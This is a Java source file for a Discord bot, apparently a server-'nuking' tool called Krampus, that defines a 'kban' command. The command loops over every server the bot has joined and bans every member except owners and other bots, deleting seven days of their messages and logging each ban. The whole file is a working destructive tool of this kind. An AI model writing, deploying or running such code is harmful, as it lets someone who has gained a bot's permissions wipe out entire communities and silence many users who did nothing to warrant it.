package dev.krampus.commands.types;

import dev.krampus.KrampusMain;
import dev.krampus.commands.AbstractCommand;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;

import java.util.concurrent.TimeUnit;

public class MassBan extends AbstractCommand {

    public MassBan() {

    }

    @Override
    public String getName() {
        return "kban";
    }

    @Override
    public void execute() {
       for(Guild guild : KrampusMain.getJda().getGuilds()){
          for(Member member : guild.loadMembers().get()){
              if(member.isOwner() || member.getUser().isBot()){
                  KrampusMain.getConsole().write("\nSkipping " + member.getUser().getName());
                  continue;
              }
              member.ban(7, TimeUnit.DAYS).queue();
              KrampusMain.getConsole().write("\nBanned " + member.getUser().getName() + " from " + guild.getName() + "!");
          }
       }
    }
}

